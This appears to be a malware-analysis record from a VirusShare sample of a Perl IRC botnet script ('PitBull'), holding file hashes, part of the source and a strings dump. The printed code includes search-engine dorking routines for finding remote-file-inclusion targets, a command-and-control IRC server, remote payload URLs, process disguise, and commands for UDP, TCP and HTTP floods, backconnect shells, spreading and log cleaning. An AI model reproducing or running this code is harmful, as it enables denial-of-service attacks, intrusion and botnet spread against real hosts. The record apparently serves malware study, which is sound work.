\"eu\",\"mil\",\"edu\",\"aero\",\"name\",\"us\",\"ca\",\"mx\",\"pa\",\"ni\",\"cu\",\"pr\",\"ve\",\"co\",\"pe\",\"ec\",\n\t\t\"py\",\"cl\",\"uy\",\"ar\",\"br\",\"bo\",\"au\",\"nz\",\"cz\",\"kr\",\"jp\",\"th\",\"tw\",\"ph\",\"cn\",\"fi\",\"de\",\"es\",\"pt\",\"ch\",\"se\",\"su\",\"it\",\"gr\",\"al\",\"dk\",\"pl\",\"biz\",\"int\",\"pro\",\"museum\",\"coop\",\n\t\t\"af\",\"ad\",\"ao\",\"ai\",\"aq\",\"ag\",\"an\",\"sa\",\"dz\",\"ar\",\"am\",\"aw\",\"at\",\"az\",\"bs\",\"bh\",\"bd\",\"bb\",\"be\",\"bz\",\"bj\",\"bm\",\"bt\",\"by\",\"ba\",\"bw\",\"bn\",\"bg\",\"bf\",\"bi\",\n\t\t\"vc\",\"kh\",\"cm\",\"td\",\"cs\",\"cy\",\"km\",\"cg\",\"cd\",\"dj\",\"dm\",\"ci\",\"cr\",\"hr\",\"kp\",\"eg\",\"sv\",\"aw\",\"er\",\"sk\",\n\t\t\"ee\",\"et\",\"ge\",\"fi\",\"fr\",\"ga\",\"gs\",\"gh\",\"gi\",\"gb\",\"uk\",\"gd\",\"gl\",\"gp\",\"gu\",\"gt\",\"gg\",\"gn\",\"gw\",\"gq\",\"gy\",\"gf\",\"ht\",\"nl\",\"hn\",\"hk\",\"hu\",\"in\",\"id\",\"ir\",\n\t\t\"iq\",\"ie\",\"is\",\"ac\",\"bv\",\"cx\",\"im\",\"nf\",\"ky\",\"cc\",\"ck\",\"fo\",\"hm\",\"fk\",\"mp\",\"mh\",\"pw\",\"um\",\"sb\",\"sj\",\"tc\",\"vg\",\"vi\",\"wf\",\"il\",\"jm\",\"je\",\"jo\",\"kz\",\"ke\",\n\t\t\"ki\",\"kg\",\"kw\",\"lv\",\"ls\",\"lb\",\"ly\",\"lr\",\"li\",\"lt\",\"lu\",\"mo\",\"mk\",\"mg\",\"my\",\"mw\",\"mv\",\"ml\",\"mt\",\"mq\",\"ma\",\"mr\",\"mu\",\"yt\",\"md\",\"mc\",\"mn\",\"ms\",\"mz\",\"mm\",\n\t\t\"na\",\"nr\",\"np\",\"ni\",\"ne\",\"ng\",\"nu\",\"no\",\"nc\",\"om\",\"pk\",\"ps\",\"pg\",\"pn\",\"pf\",\"qa\",\"sy\",\"cf\",\"la\",\"re\",\"rw\",\"ro\",\"ru\",\"eh\",\"kn\",\"ws\",\"as\",\"sm\",\"pm\",\"vc\",\t\t\n\t\t\"sh\",\"lc\",\"va\",\"st\",\"sn\",\"sc\",\"sl\",\"sg\",\"so\",\"lk\",\"za\",\"sd\",\"se\",\"sr\",\"sz\",\"rj\",\"tz\",\"io\",\"tf\",\"tp\",\"tg\",\"to\",\"tt\",\"tn\",\"tr\",\"tm\",\"tv\",\"ug\",\"ua\",\"uz\",\n\t\t\"vu\",\"vn\",\"ye\",\"yu\",\"cd\",\"zm\",\"zw\",\"\");\nmy @country = (\"AE\",\"AR\",\"AT\",\"AU\",\"BE\",\"BR\",\"CA\",\"CH\",\"CL\",\"DE\",\"DK\");\nmy @lang = (\"en\",\"es\",\"de\",\"nl\",\"pt-BR\",\"it\",\"de\",\"fo\",\"sv\",\"fr\",\"el\");\nmy @lst;\nmy $key=key($_[0]);\nmy $c=0;\nforeach my $i (@dominios){\nmy @lista = google($i,$key,$lang[$c],$country[$c]);\npush(@lst,@lista);\n$c++;\n}\nreturn @lst;\n}\n\nsub google(){\nmy @lst;\nmy $i=$_[0];\nmy $key=$_[1];\nmy $lang= $_[2];\nmy $country =$_[3];\nfor($b=0;$b<=5000;$b+=100){\nmy $Go=(\"www.google.\".$i.\"/search?hl=\".$lang.\"&q=\".key($key).\"&num=100&start=\".$b.\"&meta=cr%3Dcountry\".$country);\nmy $Res=query($Go);\nwhile($Res =~ m/<a href=\\\"?http:\\/\\/([^>\\\"]*)\\//g){\nif ($1 !~ /google/){\nmy $k=$1;\nmy @grep=links($k);\npush(@lst,@grep);\n}}}\nreturn @lst;\n}\n\n#####\n# SUBS AllTheWeb\n#####\n\nsub allthewebt {\nmy @lang = (\"en\",\"es\",\"de\",\"nl\",\"pt-BR\",\"it\",\"de\",\"fo\");\nmy @lst;\nmy $key=key($_[0]);\nmy $c=0;\nforeach my $lang (@lang){\nmy @lista = alltheweb($key,$lang[$c]);\npush(@lst,@lista);\n$c++;\n}\nreturn @lst;\n}\n\n\nsub alltheweb(){\nmy @lista;\nmy $key = $_[0];\nmy $lang= $_[1];\nfor($b=0;$b<=500;$b+=100){\nmy $alltheweb=(\"http://www.alltheweb.com/search?cat=web&_sb_lang=\".$lang.\"&hits=100&q=\".key($key).\"&o=\".$b);\nmy $Res=query($alltheweb);\nwhile($Res =~ m/<span class=\\\"?resURL\\\"?>http:\\/\\/(.+?)\\<\\/span>/g){\nmy $k=$1;\n$k=~s/ //g;\nmy @grep=links($k);\npush(@lst,@grep);\n}}\nreturn @lst;\n}\n\nsub standard()\n{\nmy @lst;\nmy $key=$_[0];\nmy $i=0;\nmy $pg=0;\nfor($i=0; $i<=1000; $i+=100)\n{\nmy $all=(\"http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=\".key($key).\"&o=\".$i);\nmy $Res=query($all);\nwhile($Res =~ m/<span class=\\\"?resURL\\\"?>http:\\/\\/(.+?)\\<\\/span>/g){\nmy $k=$1;\n$k=~s/ //g;\nmy @grep=links($k);\npush(@lst,@grep);\n}}\nreturn @lst;\n}\n\n#####\n# SUBS AOL\n#####\nsub aol(){\nmy @lst;\nmy $key = $_[0];\nfor($b=1;$b<=100;$b++){\nmy $AoL=(\"http://search.aol.com/aol/search?query=\".key($key).\"&page=\".$b.\"&nt=null&ie=UTF-8\");\nmy $Res=query($AoL);\nwhile($Res =~ m/<p class=\\\"deleted\\\" property=\\\"f:url\\\">http:\\/\\/(.+?)\\<\\/p>/g){\nmy $k=$1;\nmy @grep=links($k);\npush(@lst,@grep);\n}}\nreturn @lst;\n}\n\nsub aola(){\nmy @lst;\nmy $key = $_[0];\nfor($b=1;$b<=59;$b+=1){\nmy $AoL=(\"http://64.12.129.44/aol/search?query=\".key($key).\"&page=\".$b.\"&count_override=20&lr=lang_en\");\nmy $Res=query($AoL);\nwhile($Res =~ m/<p class=\\\"deleted\\\" property=\\\"f:url\\\">http:\\/\\/(.+?)\\<\\/p>/g){\nmy $k=$1;\nmy @grep=links($k);\npush(@lst,@grep);\n}}\nreturn @lst;\n}\n\nsub aolb(){\nmy @lst;\nmy $key = $_[0];\nfor($b=1;$b<=59;$b+=1){\nmy $AoL=(\"http://64.12.129.44/aol/search?query=\".key($key).\"&page=\".$b.\"&count_override=20&lr=lang_de\");\nmy $Res=query($AoL);\nwhile($Res =~ m/<p class=\\\"deleted\\\" property=\\\"f:url\\\">http:\\/\\/(.+?)\\<\\/p>/g){\nmy $k=$1;\nmy @grep=links($k);\npush(@lst,@grep);\n}}\nreturn @lst;\n}\n\nsub aolc(){\nmy @lst;\nmy $key = $_[0];\nfor($b=1;$b<=59;$b+=1){\nmy $AoL=(\"http://64.12.129.44/aol/search?query=\".key($key).\"&page=\".$b.\"&count_override=20&lr=lang_fr\");\nmy $Res=query($AoL);\nwhile($Res =~ m/<p class=\\\"deleted\\\" property=\\\"f:url\\\">http:\\/\\/(.+?)\\<\\/p>/g){\nmy $k=$1;\nmy @grep=links($k);\npush(@lst,@grep);\n}}\nreturn @lst;\n}\n\n#####\n# SUBS Yahoo\n#####\nsub yahoo(){\nmy @lst;\nmy $key = $_[0];\nfor($b=1;$b<=1000;$b+=100){\nmy $Ya=(\"http://search.yahoo.com/search?ei=UTF-8&p=\".key($key).\"&n=100&fr=sfp&b=\".$b);\nmy $Res=query($Ya);\nwhile($Res =~ m/\\<span class=yschurl>(.+?)\\<\\/span>/g){\nmy $k=$1;\n$k=~s/<b>//g;\n$k=~s/<\\/b>//g;\n$k=~s/<wbr>//g;\nmy @grep=links($k);\npush(@lst,@grep);\n}}\nreturn @lst;\n}\n\nsub yahooa(){\nmy @lst;\nmy $key = $_[0];\nfor($b=210;$b<=1000;$b+=210){\nmy $Ya=(\"http://search.yahoo.com/search?ei=UTF-8&p=\".key($key).\"&n=100&fr=sfp&b=\".$b);\nmy $Res=query($Ya);\nwhile($Res =~ m/\\<span class=yschurl>(.+?)\\<\\/span>/g){\nmy $k=$1;\n$k=~s/<b>//g;\n$k=~s/<\\/b>//g;\n$k=~s/<wbr>//g;\nmy @grep=links($k);\npush(@lst,@grep);\n}}\nreturn @lst;\n}\n\nsub yahoob(){\nmy @lst;\nmy $key = $_[0];\nfor($b=410;$b<=1000;$b+=210){\nmy $Ya=(\"http://search.yahoo.com/search?ei=UTF-8&p=\".key($key).\"&n=100&fr=sfp&b=\".$b);\nmy $Res=query($Ya);\nwhile($Res =~ m/\\<span class=yschurl>(.+?)\\<\\/span>/g){\nmy $k=$1;\n$k=~s/<b>//g;\n$k=~s/<\\/b>//g;\n$k=~s/<wbr>//g;\nmy @grep=links($k);\npush(@lst,@grep);\n}}\nreturn @lst;\n}\n\nsub yahooc(){\nmy @lst;\nmy $key = $_[0];\nfor($b=610;$b<=1000;$b+=210){\nmy $Ya=(\"http://search.yahoo.com/search?ei=UTF-8&p=\".key($key).\"&n=100&fr=sfp&b=\".$b);\nmy $Res=query($Ya);\nwhile($Res =~ m/\\<span class=yschurl>(.+?)\\<\\/span>/g){\nmy $k=$1;\n$k=~s/<b>//g;\n$k=~s/<\\/b>//g;\n$k=~s/<wbr>//g;\nmy @grep=links($k);\npush(@lst,@grep);\n}}\nreturn @lst;\n}\n\nsub yahood(){\nmy @lst;\nmy $key = $_[0];\nfor($b=810;$b<=1000;$b+=210){\nmy $Ya=(\"http://search.yahoo.com/search?ei=UTF-8&p=\".key($key).\"&n=100&fr=sfp&b=\".$b);\nmy $Res=query($Ya);\nwhile($Res =~ m/\\<span class=yschurl>(.+?)\\<\\/span>/g){\nmy $k=$1;\n$k=~s/<b>//g;\n$k=~s/<\\/b>//g;\n$k=~s/<wbr>//g;\nmy @grep=links($k);\npush(@lst,@grep);\n}}\nreturn @lst;\n}\n\n#####\n# SUBS MSN\n#####\nsub msn(){\nmy @lst;\nmy $key = $_[0];\nfor($b=1;$b<=1000;$b+=10){\nmy $MsN=(\"http://search.live.com/results.aspx?q=\".key($key).\"&first=\".$b.\"&FORM=PERE\");\nmy $Res=query($MsN);\nwhile($Res =~ m/<a href=\\\"?http:\\/\\/([^>\\\"]*)\\//g){\nif($1 !~ /msn|live/){\nmy $k=$1;\nmy @grep=links($k);\npush(@lst,@grep);\n}}}\nreturn @lst;\n}\n\n#####\n# SUBS ASK\n#####\nsub ask(){\nmy @lst;\nmy $key=$_[0];\nmy $i=0;\nmy $pg=0;\nfor($i=0; $i<=1000; $i+=10)\n{\nmy $Ask=(\"http://it.ask.com/web?q=\".key($key).\"&o=312&l=dir&qsrc=0&page=\".$i.\"&dm=all\");\nmy $Res=query($Ask);\nwhile($Res=~m/<a id=\\\"(.*?)\\\" class=\\\"(.*?)\\\" href=\\\"(.+?)\\onmousedown/g){\nmy $k=$3;\n$k=~s/[\\\"\\ ]//g;\nmy @grep=links($k);\npush(@lst,@grep);\n}}\nreturn @lst;\n}\n\n#####\n# SUBS FireBall\n#####\nsub fireball(){\nmy $key=$_[0];\nmy $inizio=1;\nmy $pagine=200;\nmy @lst;\nmy $av=0;\nwhile($inizio <= $pagine){\nmy $fireball=\"http://suche.fireball.de/cgi-bin/pursuit?pag=$av&query=\".key($key).\"&cat=fb_loc&idx=all&enc=utf-8\";\nmy $Res=query($fireball);\nwhile ($Res=~ m/<a href=\\\"?http:\\/\\/(.+?)\\//g ){\nif ($1 !~ /msn|live|google|yahoo/){\nmy $k=\"$1/\";\nmy @grep=links($k);\npush(@lst,@grep);\n}}\n$av=$av+10;\n$inizio++;\n}\nreturn @lst;\n}\n\n\nsub links()\n{\nmy @l;\nmy $link=$_[0];\nmy $host=$_[0];\nmy $hdir=$_[0];\n$hdir=~s/(.*)\\/[^\\/]*$/\\1/;\n$host=~s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;\n$host.=\"/\";\n$link.=\"/\";\n$hdir.=\"/\";\n$host=~s/\\/\\//\\//g;\n$hdir=~s/\\/\\//\\//g;\n$link=~s/\\/\\//\\//g;\npush(@l,$link,$host,$hdir);\nreturn @l;\n}\n\nsub geths(){\nmy $host=$_[0];\n$host=~s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;\nreturn $host;\n}\n\nsub key(){\nmy $chiave=$_[0];\n$chiave =~ s/ /\\+/g;\n$chiave =~ s/:/\\%3A/g;\n$chiave =~ s/\\//\\%2F/g;\n$chiave =~ s/&/\\%26/g;\n$chiave =~ s/\\\"/\\%22/g;\n$chiave =~ s/,/\\%2C/g;\n$chiave =~ s/\\\\/\\%5C/g;\nreturn $chiave;\n}\n\nsub query($){\nmy $url=$_[0];\n$url=~s/http:\\/\\///;\nmy $host=$url;\nmy $query=$url;\nmy $page=\"\";\n$host=~s/href=\\\"?http:\\/\\///;\n$host=~s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;\n$query=~s/$host//;\nif ($query eq \"\") {$query=\"/\";};\neval {\nmy $sock = IO::Socket::INET->new(PeerAddr=>\"$host\",PeerPort=>\"80\",Proto=>\"tcp\") or return;\nprint $sock \"GET $query HTTP/1.0\\r\\nHost: $host\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\";\nmy @r = <$sock>;\n$page=\"@r\";\nclose($sock);\n};\nreturn $page;\n}\n\nsub unici{\nmy @unici = ();\nmy %visti = ();\nforeach my $elemento ( @_ )\n{\nnext if $visti{ $elemento }++;\npush @unici, $elemento;\n}   \nreturn @unici;\n}\n\nsub http_query($){\nmy ($url) = @_;\nmy $host=$url;\nmy $query=$url;\nmy $page=\"\";\n$host =~ s/href=\\\"?http:\\/\\///;\n$host =~ s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;\n$query =~s/$host//;\nif ($query eq \"\") {$query=\"/\";};\neval {\nlocal $SIG{ALRM} = sub { die \"1\";};\nalarm 10;\nmy $sock = IO::Socket::INET->new(PeerAddr=>\"$host\",PeerPort=>\"80\",Proto=>\"tcp\") or return;\nprint $sock \"GET $query HTTP/1.0\\r\\nHost: $host\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\";\nmy @r = <$sock>;\n$page=\"@r\";\nalarm 0;\nclose($sock);\n};\nreturn $page;\n}\n}"
    },
    "filename": "VirusShare_3ad9a75ad17f198abe9035f15f1eae82",
    "filesize": 53925,
    "filetype": "a /usr/bin/perl script executable (binary data)",
    "hashes": {
        "md5": "3ad9a75ad17f198abe9035f15f1eae82",
        "sha1": "a11c1852395da2477cfb5279cb74c64c49cb9314",
        "sha256": "c0ee920014bb329ce24e735dfa3a26f5944824d235a3a353b40bf438b3af2476"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/usr/bin/perl",
            "#You can use the following commands :",
            "#!bot @portscan <ip>",
            "#!bot @nmap <ip> <beginport> <endport>",
            "#!bot @back <ip><port>    ",
            "#!bot @udpflood <ip> <packet size> <time>",
            "#!bot @tcpflood <ip> <port> <packet size> <time>",
            "#!bot @httpflood <site> <time>",
            "#!bot @linuxhelp",
            "#!bot @rfi <vuln> <dork>",
            "#!bot @system",
            "#!bot @milw0rm",
            "#!bot @logcleaner",
            "#!bot @spread <rfi = for example www.mywebsite.com/index.php?= >",
            "#!bot @sendmail <subject> <sender> <recipient> <message>",
            "#!bot @join <#channel>    ",
            "#!bot @part <#channel>",
            "#!bot @help",
            "#!bot cd tmp for example",
            "#!bot !eval <code= for example :@nickname>",
            "######################",
            "use HTTP::Request;",
            "use LWP::UserAgent;",
            "######################",
            "my $processo = '[httpds]';",
            "######################",
            "#####################################################################",
            "#/!\\                          .:CONFIGURATION:.                  /!\\#",
            "#####################################################################",
            "############################################",
            "my $linas_max='10';        ",
            "my $sleep='3';  ",
            "#-----------------                                                         ",
            "#Sleep Time and Max. Lines for Anti Flood  #",
            "############################################",
            "my $cmd=\"http://www.freewebs.com/scar_coder/x2300.txt\";",
            "my $id=\"http://www.freewebs.com/scar_coder/id.txt\";",
            "my $spread=\"http://www.freewebs.com/scar_coder/id.txt\";",
            "#-----------------    ",
            "#Spreader, ID=Response, CMD = Print CMD    #",
            "############################################",
            "my @adms=(\"r00t\",\"r00t_\",\"janglebyte\");",
            "#-----------------                         #",
            "#Admins of the Bot set your nickname here  #",
            "############################################",
            "my @canais=(\"#2300\");",
            "#-----------------                         #",
            "#Put your channel here                     #",
            "############################################",
            "my @nickname = (\"scanbot\");",
            "my $nick = $nickname[rand scalar @nickname];",
            "my $ircname ='asc-rf1';",
            "chop (my $realname = 'we r0x');",
            "#-----------------                         #",
            "#Identity                                  #",
            "############################################",
            "$servidor='irc.zerofuzion.net' unless $servidor;",
            "my $porta='6667';",
            "#-----------------                         #",
            "#IRCServer and port                        #",
            "############################################",
            "#####################################################################",
            "#/!\\                          .:CONFIGURATION:.                  /!\\#",
            "#####################################################################",
            "######################",
            "#End of Configuration# ",
            "#                    #",
            "######################",
            "$SIG{'INT'} = 'IGNORE';",
            "$SIG{'HUP'} = 'IGNORE';",
            "$SIG{'TERM'} = 'IGNORE';",
            "$SIG{'CHLD'} = 'IGNORE';",
            "$SIG{'PS'} = 'IGNORE';",
            "use IO::Socket;",
            "use Socket;",
            "use IO::Select;",
            "chdir(\"/\");",
            "#Connect",
            "$servidor=\"$ARGV[0]\" if $ARGV[0];",
            "$0=\"$processo\".\"\\0\"x16;;",
            "my $pid=fork;",
            "exit if $pid;",
            "die \"Masalah fork: $!\" unless defined($pid);",
            "our %irc_servers;",
            "our %DCC;",
            "my $dcc_sel = new IO::Select->new();",
            "$sel_cliente = IO::Select->new();",
            "sub sendraw {",
            "  if ($#_ == '1') {",
            "    my $socket = $_[0];",
            "    print $socket \"$_[1]\\n\";",
            "    } else {",
            "    print $IRC_cur_socket \"$_[0]\\n\";",
            "sub conectar {",
            "  my $meunick = $_[0];",
            "  my $servidor_con = $_[1];",
            "  my $porta_con = $_[2];",
            "  my $IRC_socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$servidor_con\",",
            "  PeerPort=>$porta_con) or return(1);",
            "  if (defined($IRC_socket)) {",
            "    $IRC_cur_socket = $IRC_socket;",
            "    $IRC_socket->autoflush(1);",
            "    $sel_cliente->add($IRC_socket);",
            "    $irc_servers{$IRC_cur_socket}{'host'} = \"$servidor_con\";",
            "    $irc_servers{$IRC_cur_socket}{'porta'} = \"$porta_con\";",
            "    $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;",
            "    $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;",
            "    nick(\"$meunick\");",
            "    sendraw(\"USER $ircname \".$IRC_socket->sockhost.\" $servidor_con :$realname\");",
            "    sleep 1;",
            "my $line_temp;",
            "while( 1 ) {",
            "  while (!(keys(%irc_servers))) { conectar(\"$nick\", \"$servidor\", \"$porta\"); }",
            "  delete($irc_servers{''}) if (defined($irc_servers{''}));",
            "  my @ready = $sel_cliente->can_read(0);",
            "  next unless(@ready);",
            "  foreach $fh (@ready) {",
            "    $IRC_cur_socket = $fh;",
            "    $meunick = $irc_servers{$IRC_cur_socket}{'nick'};",
            "    $nread = sysread($fh, $msg, 4096);",
            "    if ($nread == 0) {",
            "      $sel_cliente->remove($fh);",
            "      $fh->close;",
            "      delete($irc_servers{$fh});",
            "    }",
            "    @lines = split (/\\n/, $msg);",
            "    for(my $c=0; $c<= $#lines; $c++) {",
            "      $line = $lines[$c];",
            "      $line=$line_temp.$line if ($line_temp);",
            "      $line_temp='';",
            "      $line =~ s/\\r$//;",
            "      unless ($c == $#lines) {",
            "        parse(\"$line\");",
            "        } else {",
            "        if ($#lines == 0) {",
            "          parse(\"$line\");",
            "          } elsif ($lines[$c] =~ /\\r$/) {",
            "          parse(\"$line\");",
            "          } elsif ($line =~ /^(\\S+) NOTICE AUTH :\\*\\*\\*/) {",
            "          parse(\"$line\"); ",
            "                 } else {",
            "                             $line_temp = $line;",
            "        }",
            "      }",
            "    }",
            "sub parse {",
            "  my $servarg = shift;",
            "  if ($servarg =~ /^PING \\:(.*)/) {",
            "    sendraw(\"PONG :$1\");",
            "    } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?) PRIVMSG (.+?) \\:(.+)/) {",
            "    my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;",
            "    if ($args =~ /^\\001VERSION\\001$/) {",
            "           notice(\"$pn\", \"\\001VERSION mIRC v6.17 PitBull\\001\");",
            "    }",
            "    if (grep {$_ =~ /^\\Q$pn\\E$/i } @adms ) {",
            "    if ($onde eq \"$meunick\"){",
            "    shell(\"$pn\", \"$args\");",
            "#End of Connect",
            "# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%",
            "# % The_PitBull Pwned your BoX  %",
            "# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.% ",
            "######################",
            "#      PREFIX        #",
            "#                    #",
            "######################",
            "# You can change the prefix if you want but the commands will be different ",
            "# The standard prefix is !bot if you change it into !bitch for example ",
            "# every command will be like !bitch @udpflood, !bitch @googlescan.",
            "# So its recommended not to change this ;)",
            "######################",
            "  if ($args =~ /^(\\Q$meunick\\E|\\!bot)\\s+(.*)/ ) {",
            "    my $natrix = $1;",
            "    my $arg = $2;",
            "    if ($arg =~ /^\\!(.*)/) {",
            "      ircase(\"$pn\",\"$onde\",\"$1\") unless ($natrix eq \"!bot\" and $arg =~ /^\\!nick/);",
            "      } elsif ($arg =~ /^\\@(.*)/) {",
            "      $ondep = $onde;",
            "      $ondep = $pn if $onde eq $meunick;",
            "      bfunc(\"$ondep\",\"$1\");",
            "      } else {",
            "      shell(\"$onde\", \"$arg\");",
            "    }",
            "######################",
            "#   End of PREFIX    #",
            "#                    #",
            "######################",
            "elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?)\\s+NICK\\s+\\:(\\S+)/i) {",
            "if (lc($1) eq lc($meunick)) {",
            "  $meunick=$4;",
            "  $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;",
            "} elsif ($servarg =~ m/^\\:(.+?)\\s+433/i) {",
            "nick(\"$meunick\".int rand(999999));",
            "} elsif ($servarg =~ m/^\\:(.+?)\\s+001\\s+(\\S+)\\s/i) {",
            "$meunick = $2;",
            "$irc_servers{$IRC_cur_socket}{'nick'} = $meunick;",
            "$irc_servers{$IRC_cur_socket}{'nome'} = \"$1\";",
            "foreach my $canal (@canais) {",
            "  sendraw(\"JOIN $canal ddosit\");",
            "sub bfunc {",
            "my $printl = $_[0];",
            "my $funcarg = $_[1];",
            "if (my $pid = fork) {",
            "waitpid($pid, 0);",
            "} else {",
            "if (fork) {",
            "  exit;",
            "} else {",
            "######################",
            "#       Help         # ",
            "#                    #",
            "######################",
            "if ($funcarg =~ /^help/) {",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 Select the function you want help for\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "ddos\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "rfiscan\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "backconnect\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "shell\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "portscanner\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 Or if you want too know all the commands type:\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "commands\");",
            "if ($funcarg =~ /^ddos/) {",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 There are 3 DDossers in this bot\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 UDPFlood, HTTPFlood and TCPFlood\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "udpflood <ip> <packet size> <time>\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "tcpflood <ip> <port> <packet size> <time>\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "httpflood <site> <time>\");",
            "if ($funcarg =~ /^rfiscan/) {",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 This bot also contains a RFI Scanner.\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 Commands :\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "rfi <vuln> <dork>\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 You can find strings here : http://www.xshqiptaretx.org/strings.txt \");",
            "if ($funcarg =~ /^backconnect/) {",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 You use backconnect like this :\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "back <ip><port>\");",
            "if ($funcarg =~ /^shell/) {",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 This bot has a integrated shell\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 You can use it in private but also public in the channel\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 In public channel just use : ",
            "7!bot cd tmp",
            "12 for example\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 For help with the linux commands type :",
            "!bot ",
            "linuxhelp\");",
            "if ($funcarg =~ /^portscanner/) {",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 There is a normal portscan and a Nmap:\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "portscan <ip>\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "nmap <ip> <beginport> <endport>\");",
            "if ($funcarg =~ /^commands/) {",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 You can use the following commands :\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "portscan <ip>\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "nmap <ip> <beginport> <endport>\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "back <ip><port>\");    ",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "cd tmp ",
            "12 for example\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "udpflood <ip> <packet size> <time>\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "tcpflood <ip> <port> <packet size> <time>\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "httpflood <site> <time>\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "linuxhelp\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "spread <rfi>\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "rfi <vuln> <dork>\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "system\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "logcleaner\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "sendmail <subject> <sender> <recipient> <message>\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "milw0rm\");    ",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "join #channel\");    ",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Help",
            "12] ",
            "12 !bot ",
            "part #channel\");",
            "if ($funcarg =~ /^linuxhelp/) {",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "LiNuX",
            "12] ",
            "12 - ",
            "12 Dir where you are : pwd\");",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "LiNuX",
            "12] ",
            "12 - ",
